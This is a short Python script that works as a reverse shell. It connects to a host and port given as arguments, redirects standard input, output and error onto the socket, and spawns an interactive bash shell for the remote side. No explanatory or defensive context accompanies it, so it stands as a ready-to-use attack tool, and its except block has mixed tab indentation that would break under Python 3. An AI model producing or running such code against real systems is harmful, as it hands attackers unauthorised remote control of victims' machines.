import socket,os
import pty
import sys


def main(arg):
    print(arg[1])
    print(arg[2])
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((arg[1], int(arg[2])))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        pty.spawn("/bin/bash")
    except Exception as e:
	print(e)
        print("Could not connect to server")



if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit()
    main(sys.argv)
